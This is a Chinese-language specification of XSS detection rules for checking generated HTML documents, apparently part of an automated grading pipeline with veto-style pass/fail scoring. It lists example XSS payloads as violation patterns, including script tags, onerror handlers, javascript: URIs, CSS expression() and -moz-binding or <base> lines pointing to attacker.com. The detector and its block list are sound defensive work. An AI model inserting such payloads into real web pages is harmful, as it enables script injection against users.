# 安全性审查（XSS 防护）检测规则

**维度权重：独立维度，不参与综合分计算。任意检测项触发 → 整体 `passed = false`（一票否决）**

## 检测目标

确保输出 HTML 不包含任何可被浏览器执行的恶意代码或外部资源引用，防止 XSS 注入风险。

## 检测项列表

### SC-01：禁止 `<script>` 标签

HTML 中不得出现任何 `<script>` 标签，包括内联脚本和外部引用。

**违规模式：**
- `<script>alert(1)</script>`
- `<script src="evil.js"></script>`
- `<script type="text/javascript">...</script>`

**例外：** 无例外，一律禁止。

---

### SC-02：禁止内联事件处理器

HTML 元素不得含有任何 `on*` 事件属性。

**违规模式：**
- `<img src="x" onerror="alert(1)">`
- `<div onclick="doSomething()">`
- `<body onload="init()">`
- `<a onmouseover="...">`

**检测方式：** 正则 `\son\w+\s*=`

---

### SC-03：禁止 `javascript:` 伪协议

`href`、`src`、`action` 等属性不得使用 `javascript:` 开头的值。

**违规模式：**
- `<a href="javascript:void(0)">` — 应改用 `href="#"` 或 `href="#section-N"`
- `<iframe src="javascript:...">`
- `<form action="javascript:...">`

**例外：** `href="#"` 锚点和 `href="#section-N"` 文档内锚点允许。

---

### SC-04：禁止危险嵌入标签

不得出现以下标签（在排版文档中无合理使用场景）：
- `<iframe>`
- `<object>`
- `<embed>`
- `<applet>`
- `<base>`

**违规模式：**
```html
<iframe src="https://example.com"></iframe>   ❌
<object data="file.swf"></object>              ❌
<base href="https://attacker.com">             ❌
```

---

### SC-05：禁止 CSS 危险表达式

`<style>` 块和 `style` 属性中不得出现以下内容：

- `expression(...)` — IE 遗留 CSS 表达式，可执行任意 JS
- `url(javascript:...)` — CSS 中的 JS 伪协议
- `-moz-binding` — Firefox XBL 绑定，可加载外部脚本

**违规模式：**
```css
width: expression(document.body.offsetWidth);   ❌
background: url(javascript:alert(1));            ❌
-moz-binding: url(http://attacker.com/xss.xml);  ❌
```

---

### SC-06：禁止外部资源引用

`<img>`、`<link>`、`<script>`、`<form>` 等标签的 `src`/`href`/`action` 属性不得引用外部 URL。

**违规判定（FAIL）：**
- `<img src="https://tracker.example.com/pixel.gif">` — 外部图片
- `<link href="https://unknown.cdn.com/style.css">` — 非字体的外部样式
- `<form action="https://external.com/submit">` — 外部表单提交

**警告判定（WARNING，不影响 passed）：**
- `<link rel="stylesheet" href="https://fonts.googleapis.com/...">` — Google Fonts 等知名字体服务
- `<link rel="stylesheet" href="https://fonts.bunny.net/...">` — 同类字体 CDN

文档应为自包含 HTML，所有资源通过 CSS 变量或内联方式提供。

---

## 评分标准

| 触发项 | 影响 |
|--------|------|
| SC-01 存在 `<script>` 标签 | 整体 `passed = false`，`score = 0` |
| SC-02 内联事件处理器 | 整体 `passed = false`，`score = 0` |
| SC-03 `javascript:` 伪协议 | 整体 `passed = false`，`score = 0` |
| SC-04 危险嵌入标签 | 整体 `passed = false`，`score = 0` |
| SC-05 CSS 危险表达式 | 整体 `passed = false`，`score = 0` |
| SC-06 外部资源（非字体服务） | 整体 `passed = false`，`score = 0` |
| SC-06 外部字体服务（Google Fonts 等） | WARNING，计入 `issues`，不影响 `passed` |

安全性维度不参与综合分计算，但任意 SC-01~SC-06（字体服务除外）触发均导致整体 `passed = false`。

## 修正建议格式

```
[SC-0X] {元素描述} 包含 {违规内容}，存在 XSS/注入风险，请删除该属性/标签或替换为安全写法
```

示例：
- `[SC-01] 文档末尾存在 <script> 标签，内含内联脚本，请完全删除该标签`
- `[SC-02] <img> 元素含有 onerror 事件属性，请删除该属性`
- `[SC-03] <a href="javascript:void(0)"> 使用了 javascript: 伪协议，请改为 href="#" 或有效锚点`
- `[SC-04] 文档中存在 <iframe> 标签，排版文档不允许嵌入框架，请删除`
- `[SC-06] <img src="https://tracker.example.com/pixel.gif"> 引用了外部资源，请改为内联或删除`
